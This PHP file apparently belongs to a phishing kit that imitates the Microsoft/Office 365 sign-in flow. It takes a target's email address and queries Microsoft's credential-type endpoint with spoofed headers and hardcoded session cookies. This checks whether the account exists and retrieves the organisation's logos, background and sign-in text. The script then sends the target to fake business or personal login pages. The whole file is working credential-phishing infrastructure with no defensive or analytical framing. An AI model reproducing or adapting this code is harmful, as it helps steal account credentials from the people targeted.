<?php
include('blocker.php');
ob_start();
session_start(); 
  $csrftoken = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));

function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
}
$email = $_GET['email'];
if(!isset($_GET['email'])){
    header("Location: signin");
  exit();
}
require '../extra/mine.php';
if ($validemail=="no") {
  $checked="Turn on it via mine.php";
  $_SESSION['checked'] = $checked;
    if ($loginpage=="1"){
  header("Location: pickemail?csrftoken=".$csrftoken."&email=".$_GET['email']."");
  exit();
  }
    if ($loginpage=="2"){
  header("Location: nextlogin?csrftoken=".$csrftoken."&email=".$_GET['email']."");
  exit();
}
}
if(isset($_GET['email'])){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://login.microsoftonline.com/common/GetCredentialType?mkt=ar-SA");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"username\":\"".strip_tags($email)."\",\"isOtherIdpSupported\":true,\"checkPhones\":false,\"isRemoteNGCSupported\":false,\"isCookieBannerShown\":false,\"isFidoSupported\":false,\"originalRequest\":\"rQIIAYVSz2vTYABt2q1uIjo8efAwwZPaNmmT1BWGZEkbW_sl7Zq2Sy6lzY_2S5Mvv762WU4ePc6DMAdePA4E8SQD_4Gdhkf_AhEFEUEv_ljZxZvv8Hg83uHBe3cyVJ6q3CYvwOaWnCMti8rp5lL9g_D65Y3Cn8NfJ4cPuFfzI_X12o_vx8StCcZ-VCkUfC_EQyfvWRbUzbzuuQVniAyIxm8J4owgPhLEUXp1GOY63HE6YktsuVgskwxDb21RFENTeUkY08DmYpAArNrqAnRIUhbr-01lTKl2G8tKz9UULpbsnguKbUZNdEru91ypr2JVaSeAJ0mg6KWmMrHVPlh6saRMY0nctWVBm35IX5O5GZ4Ul-SFMDG_pdctL3QHvhfho8x7QvZNVDd4DyFTx_llzEQY6kMMPdQKPd8MMTSj7VguskoU0DWYNOuIAfuOvAerOBd3dtmdGCf-ZJcRuR5fnCCEYkNwgVAFQwOL_cYCh5wE2U5Z2Rk1jNa0uxg_5GtCSZqOZnQrWMhcO3G6M6fxqDfoC7WmABbVuN1kgi7XcQV1GAe8hiJH6-eoTjBwSdEx1XmXbne1Wc3xImUUabHU6LnULBw0vEB9k8meD-F66DRz9bw_gsamH3oWdMyzFeLTyhUyU1lby25kbqQ2Uz9XiJer5xN_OXx678W73-Dx55vw2XM2dbpa2DOrPjl2_Pm8wTNbpSY_set4Srt3Rdiy_FlwXy-x-xpjiQbYLleogyxxkM1-zRJPLqVO1v9_kL81\",\"country\":\"EG\",\"flowToken\":\"AQABAAEAAADXzZ3ifr-GRbDT45zNSEFEWJXpyuWjnvuUvXgJzUEtusd4IYw8zGEFR87894cMVWHBV0KMOIX4HvhWhpRPKt0zby4imQvu543UIjM7HGhKAOontuB4djF2c79B_Imyfzoa0pdt5hf6z4tOEO2ITeEjfN_EDBq4Y-6ll2jdnNfN5aJi4RNUnBqcCJH3rtEidxVCt9zZqC5CrlIBLUGt7YoZHrU9-ubXG9jaCyAuCr7Yf-DfBOwHRsRBOP0rUv_eHYWsNI3mtQ-4ymHCyKXwpvn2v7qoCDxFxOkvvGvVxSzCrLRQOvkbyr-Zmo9NSIL1kaz555TFp6HpjkeTn-hhpDiusMv3Vor8wmg7MNMXeEEjnwREbIm0hLnRUz2tVOk_0FAyLqZf6XvrQDirQlwLwn0qIAA\"}");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = "Origin: https://login.microsoftonline.com";
$headers[] = "Accept-Encoding: gzip, deflate, br";
$headers[] = "Accept-Language: ar,en-US;q=0.9,en;q=0.8";
$headers[] = "Client-Request-Id: fd98ff2f-98ba-413f-ad76-9a59b008f7f4";
$headers[] = "Canary: AQABAAAAAADXzZ3ifr-GRbDT45zNSEFE1Yij0xjKCPe46utuEjix0xFhYMANXhFa5p7IhJRNOcM32dsHTJKaZiWoSWxkXD_i3Dhku9LA8o9sDbigPtjoUyLP2HqK726RpwczMbvHwKIgMXRsG_bPwtaUjz7nlFvKO3Iy2YEV32b-RqvumAgCY6goH_C8EO_mFENwkG1KTVLH1yGDOmnWehzg8YeuCh2OjqaviJClLxVF7nGZ5-NWCCAA";
$headers[] = "Cookie: esctx=AQABAAAAAADXzZ3ifr-GRbDT45zNSEFEwPEnhXbFSf1iMCwkCQPrCrBXJSZHS_xkv5uqffLZwxbaL-CZ3esKaQG_FdmvsAeMNipA_0DBhG2EjayAcJ9UDFp6NtFvxM7L1w40ElTmn31V-_Yj2W5Pb7fY3eTzKaYIxWWo3FyCw0L8PsJvgjWobM6gYCRi1St7gUe3rPW2BiogAA; stsservicecookie=ests; ESTSAUTHPERSISTENT=AQABAAQAAADXzZ3ifr-GRbDT45zNSEFEc64pmD-OsSat82EijNRKHkOusB8V2HKIpaTsQVNUZjvisD0pnx9G4O__FAd3WcbFHsANVMyltaYQR_PLijhDFoq5qbugb2DVWXb_GkP8wHJIUghAvMYphw6F2Tfrw_3c_GBnXd1LDjwOQ_dzaca--Ck0kFafxRkUl96gxhwom8diqc9yqsqPB268EL1_Kc6vfZRrz6oxBPRGzjlgcPFKJnnWEN_zbRvy5D0ZAaNFBGiljWTxSFdIo87W52dDPk41CwO1zDcNT1Wu-MUIoQH7gfixbByJgqULjz0_j38uh9JpfijpxonFj5MLfaTFAvkN1NmojK4ZfpNLkpAt1AwZYOyRIbVpuNv91WF6XWueekYLx2e3_we1IjwwtB_Mek5hcEzQIQirziaKlAggUinW4EuyTo3J40tN-Kh7bUrt2G27-jPQHGVIZ71XwCcw7floeY8woY1Yuit8_z6w_e7fFyAAIABAAOAAAAA; ESTSAUTH=AQABAAQAAADXzZ3ifr-GRbDT45zNSEFEjsO0IywAqbPIaBFYrP6ZOrVNRQ06NFY4OPovae861_Iq9YXBf8BME8sbknXQcnOfmVbGkYk1umL9F4m4jldK-01C6tMzeuJ1yQcllRiDQfhsH_wbfBGgy6dCTx7VdWyCEsbPnZ4XRG7iVLQReGQuROl-sRo_pjxbeVE60BvIE7Th6ahPC0yo3ftTxAkDr1tar-TJmb3oUMO0Wc9BiwpeMSAAIABAACAAAAA; ESTSAUTHLIGHT=+; ESTSSC=00; buid=AQABAAEAAADXzZ3ifr-GRbDT45zNSEFEtvIKH5yEG81RDCw061lh2rlzCc6EA503_OOpBtBOyBM2fXrA9IRl84m4Oz6CQVniCJaRpTzLG20S4IJrvlpF05NzDrLh9jpEt1xSCGdqMDJcOgypHz8RSyDPN2Y6nKzxmoWXJ7usTerqVXjheVvMTSAA; x-ms-gateway-slice=017";
$headers[] = "Connection: keep-alive";
$headers[] = "Hpgact: 1800";
$headers[] = "Hpgrequestid: 2c9198ed-bd9d-4dfe-80ec-1c6995993600";
$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36";
$headers[] = "Content-Type: application/x-www-form-urlencoded";
$headers[] = "Hpgid: 1104";
$headers[] = "Accept: application/json";
$headers[] = "Referer: https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000006-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid+profile&state=OpenIdConnect.AuthenticationProperties%3dxO26Tsq4FizLIn5MylOXiEt-xSR6BxtzphR5GAVC2hnnnxdDmMDEMadtGWJwtrANi6S7TBbJdPkUwgHCFD3Nkbu4PqwOAQzlUulJKV_WDFLDMwExQL5qUASmDYaxqCZnslZW-1Sq_m0GleYvU4QUZuFlosTbsZxNJVm1ur_JoqY&nonce=636722705549911541.NDg4MjAxMzMtYjYwMS00OGIyLTg1YjQtOTVmZTAxNjVmM2Q5Yzc1OWVmNWYtYTQzMC00MTc3LThjYWMtYTQxNTkxNGRjODZk&redirect_uri=https%3a%2f%2fportal.office.com%2flanding&ui_locales=ar-SA&mkt=ar-SA&client-request-id=fd98ff2f-98ba-413f-ad76-9a59b008f7f4";
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$check = curl_exec($ch);
$ExistsResult = trim(strip_tags(getstr($check,'IfExistsResult":',',"')));
$usertenant = trim(strip_tags(getstr($check,'UserTenantBranding":',',"')));
if ($usertenant !== "null" && $ExistsResult=="0" || $usertenant !== "null" && $ExistsResult=="6") {

if (strpos($check, 'BannerLogo')) {
$BannerLogo = trim(strip_tags(getstr($check,'"BannerLogo":"','",')));
$_SESSION['BannerLogo'] = $BannerLogo;
}
if (strpos($check, 'TileLogo')) {
$TileLogo = trim(strip_tags(getstr($check,'"TileLogo":"','",')));
$_SESSION['TileLogo'] = $TileLogo;
}
if (strpos($check, 'Illustration')) {
$background = trim(strip_tags(getstr($check,'"Illustration":"','",')));
$_SESSION['background'] = $background;
}
if (strpos($check, 'BackgroundColor')) {
$BackgroundColor = trim(strip_tags(getstr($check,'"BackgroundColor":"','",')));
$_SESSION['BackgroundColor'] = $BackgroundColor;
}
if (strpos($check, 'BoilerPlateText')) {
$text = trim(strip_tags(getstr($check,'"BoilerPlateText":"','",')));
$_SESSION['text'] = $text;
}
  header("Location: bussnisslogin?csrftoken=".$csrftoken."&email=".$_GET['email']."");
    $checked="bussniss";
  $_SESSION['checked'] = $checked;
  exit();
  }

if ($ExistsResult== "0" && $usertenant == "null"  || $ExistsResult=="6" && $usertenant == "null") {
  $checked="live";
  $_SESSION['checked'] = $checked;
if (isset($_GET['type'])) {
  if ($_GET['type'] =="signed")
  header("Location: nextlogin?csrftoken=".$csrftoken."&email=".$_GET['email']."");
  exit();
}
  if ($loginpage=="1"){
  header("Location: pickemail?csrftoken=".$csrftoken."&email=".$_GET['email']."");
  exit();
  }
    if ($loginpage=="2"){
  header("Location: nextlogin?csrftoken=".$csrftoken."&email=".$_GET['email']."");
  exit();
}
}else{
    header("Location: signin?csrftoken=".$csrftoken."&email=".$_GET['email']."&invalid");
  exit();
}

}else{
                  exit(header('HTTP/1.0 404 Not Found'));

}
//}
?>